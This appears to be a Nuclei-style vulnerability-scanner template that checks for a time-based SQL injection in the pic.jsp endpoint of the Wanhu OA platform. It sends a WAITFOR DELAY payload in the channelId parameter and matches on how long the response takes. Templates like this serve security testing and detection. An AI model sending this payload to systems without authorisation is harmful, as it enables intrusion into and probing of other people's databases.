id: poc-yaml-wanhu-oa-pic-jsp-sqli
info:
  name: Wanhu OA Platform pic.jsp SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in the pic.jsp endpoint of the Wanhu OA Platform.

variables:
  t1: "{{rand_int(2, 5)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - raw:
      - |
        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--&num=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/defaultroot/scripts/main/whir.validation.js"
      - type: dsl
        dsl:
          - duration > to_number(t1)
          - duration < to_number(t2)
